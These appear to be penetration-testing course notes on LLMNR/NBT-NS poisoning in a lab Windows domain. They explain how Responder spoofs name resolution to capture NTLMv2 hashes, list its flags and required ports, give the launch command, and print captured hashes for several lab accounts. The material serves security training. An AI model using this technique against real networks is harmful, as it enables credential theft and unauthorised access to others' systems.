## Table of Contents

  - [Table of Contents](#Table\of\Contents)
- [Example - LLMNR NBT-NS Poisoning](#example\-\llmnr\nbt-ns\poisoning)
- [Responder flags](#responder\flags)
      - [Starting Responder with Default Settings](#Starting\Responder\with\Default\Settings)

## Table of Contents

- [Example - LLMNR NBT-NS Poisoning](#example\-\llmnr\nbt-ns\poisoning)
- [Responder flags](#responder\flags)
      - [Starting Responder with Default Settings](#Starting\Responder\with\Default\Settings)

**Goal: Valid Cleartext of a Domain Account**
This section and the next will cover a common way to gather credentials and gain an initial foothold during an assessment: a Man-in-the-Middle attack on Link-**Local Multicast Name Resolution (LLMNR**) and **NetBIOS Name Service (NBT-NS) broadcasts**
	- LLMNR and NBT-NS are MS Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempt to resolve a host but RNS resolution fails, typically the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP normally. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name over UDP port 137

The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with `Responder` to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.

# Example - LLMNR NBT-NS Poisoning
1. Host attempts to connect to the print server at \\\\print01.inlanefreight.local, butaccidentally types in \\\\printer01.inlanefreight.local
2. The DNS server responds, stating that this host is unknown
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\\\printer01.inlanefreight.local
4. The attacker (With **Responder** running) responds to the hosts stating that it is the \\printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB relay attack if the right conditions exist.


|**Tool**|**Description**|
|---|---|
|[Responder](https://github.com/lgandx/Responder)|Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.|
|[Inveigh](https://github.com/Kevin-Robertson/Inveigh)|Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.|
|[Metasploit](https://www.metasploit.com/)|Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.|

This section and the following one will show examples of using Responder and Inveigh to capture password hashes and attempt to crack them offline. We commonly start an internal penetration test from an anonymous position on the client's internal network with a Linux attack host. Tools such as Responder are great for establishing a foothold that we can later expand upon through further enumeration and attacks. Responder is written in Python and typically used on a Linux attack host, though there is a .exe version that works on Windows. Inveigh is written in both C# and PowerShell (considered legacy). Both tools can be used to attack the following protocols:

- LLMNR
- DNS
- MDNS
- NBNS
- DHCP
- ICMP
- HTTP
- HTTPS
- SMB
- LDAP
- WebDAV
- Proxy Auth

Responder also has support for:

- MSSQL
- DCE-RPC
- FTP, POP3, IMAP, and SMTP auth

# Responder flags
```shell
responder -h
___

Usage: responder -I eth0 -w -r -f
or:
responder -I eth0 -wrf
-A : Analyze mode, allows NTB-NS view, browser, LLMNR requests no response
-i : ip address
-e :Poison all requests with another IP address than Responders         -b : basic HTTP authentication 
-f : fingerprint
-P proxy auth
-F Forcewpadauth
--lm : Force LM hashing downgrade for windows

```
 Some common options we'll typically want to use are `-wf`; this will start the WPAD rogue proxy server, while `-f` will attempt to fingerprint the remote host operating system and version. We can use the `-v` flag for increased verbosity if we are running into issues, but this will lead to a lot of additional data printed to the console. Other options such as `-F` and `-P` can be used to force NTLM or Basic authentication and force proxy authentication, but may cause a login prompt, so they should be used sparingly. The use of the `-w` flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has [Auto-detect settings](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11) enabled.


With this configuration shown above, Responder will listen and answer any requests it sees on the wire. If you are successful and manage to capture a hash, Responder will print it out on screen and write it to a log file per host located in the `/usr/share/responder/logs` directory. Hashes are saved in the format `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`, and one hash is printed to the console and stored in its associated log file unless `-v` mode is enabled. For example, a log file may look like `SMB-NTLMv2-SSP-172.16.5.25`. Hashes are also stored in a SQLite database that can be configured in the `Responder.conf` config file, typically located in `/usr/share/responder` unless we clone the Responder repo directly from GitHub.

We must run the tool with sudo privileges or as root and make sure the following ports are available on our attack host for it to function best:

```shell-session

UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
```


Any of the rogue servers (i.e., SMB) can be disabled in the `Responder.conf` file

#### Starting Responder with Default Settings

Code: bash

```bash
sudo responder -I ens224
```


172.16.5.130
[MSSQL] NTLMv2 Username : INLANEFREIGHT\lab_adm
[MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:8366e7fafa92eb5a:968CF8264956999A5F8E5FBFBB661989:010100000000000039A8E65030EFD9011E1D57A62DA0E77300000000020008005000560041004F0001001E00570049004E002D00560033005500420054004200320034004C0032004E00040014005000560041004F002E004C004F00430041004C0003003400570049004E002D00560033005500420054004200320034004C0032004E002E005000560041004F002E004C004F00430041004C00050014005000560041004F002E004C004F00430041004C000800300030000000000000000000000000300000B0190F4E13AAB234F1F62B8BB784E94D7195E76EC275FA180609174776880FBC0A0010000000000000000000000000000000000009003A004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030003A0031003400330033000000000000000000 

INLANEFREIGHT\wley
[SMB] NTLMv2-SSP Hash     : wley::INLANEFREIGHT:87414b14ace9cddc:FDAC998652F2DBB1AEAF1A28C85C700F:010100000000000080031CC80EEFD9011FF8C15CBC3F65A000000000020008005000560041004F0001001E00570049004E002D00560033005500420054004200320034004C0032004E0004003400570049004E002D00560033005500420054004200320034004C0032004E002E005000560041004F002E004C004F00430041004C00030014005000560041004F002E004C004F00430041004C00050014005000560041004F002E004C004F00430041004C000700080080031CC80EEFD90106000400020000000800300030000000000000000000000000300000B0190F4E13AAB234F1F62B8BB784E94D7195E76EC275FA180609174776880FBC0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000



svc_qualys::INLANEFREIGHT:9789581d6edc1132:40AF9E23ADA6B3F3F8D435178D4AB6B3:010100000000000080031CC80EEFD9014C92141243E5E2AB00000000020008005000560041004F0001001E00570049004E002D00560033005500420054004200320034004C0032004E0004003400570049004E002D00560033005500420054004200320034004C0032004E002E005000560041004F002E004C004F00430041004C00030014005000560041004F002E004C004F00430041004C00050014005000560041004F002E004C004F00430041004C000700080080031CC80EEFD90106000400020000000800300030000000000000000000000000300000B0190F4E13AAB234F1F62B8BB784E94D7195E76EC275FA180609174776880FBC0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000


forend::INLANEFREIGHT:08cef5c9ac649cb9:C9CE9DB0DAF67F962F5C599768CC4D7F:010100000000000080031CC80EEFD90181C1A53A2FF3C07E00000000020008005000560041004F0001001E00570049004E002D00560033005500420054004200320034004C0032004E0004003400570049004E002D00560033005500420054004200320034004C0032004E002E005000560041004F002E004C004F00430041004C00030014005000560041004F002E004C004F00430041004C00050014005000560041004F002E004C004F00430041004C000700080080031CC80EEFD90106000400020000000800300030000000000000000000000000300000B0190F4E13AAB234F1F62B8BB784E94D7195E76EC275FA180609174776880FBC0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000




